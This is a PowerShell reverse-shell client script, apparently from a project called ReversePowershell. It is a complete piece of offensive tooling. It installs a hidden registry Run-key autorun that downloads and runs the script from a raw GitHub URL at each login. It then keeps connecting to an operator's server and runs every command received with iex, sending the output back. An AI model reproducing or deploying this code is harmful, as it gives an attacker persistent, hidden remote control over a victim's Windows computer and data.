# Replace address and port with your server's
# You can edit the script URL if you are hosting it somewhere else

$address = 'localhost'
$port = 8000
$scriptURL = 'https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1'
$autorunKeyName = "Windows Powershell"
$autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'

# Persist
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}

while ($true) {
	# Try to connect to server every 10s
	do {
		try {
			$client = New-Object System.Net.Sockets.TcpClient($address, $port)
		}
		catch {
			Start-Sleep -s 10
		}
	} while (-not $client)

	$stream = $client.GetStream()
	$writer = New-Object System.IO.StreamWriter($stream)
	$reader = New-Object System.IO.StreamReader($stream)

	# Execute commands sent by the server, and return output
	do {
		$cmd = $reader.ReadLine()
		if ($cmd -eq 'bye') {
			break
		}
		try {
			$output = [string](iex $cmd)
		}
		catch {
			$output = $_.Exception.Message
		}
		$writer.WriteLine($output)
		$writer.Flush()
	} while($true)

	# Cleanup
	$reader.Close()
	$writer.Close()
	$client.Close()
}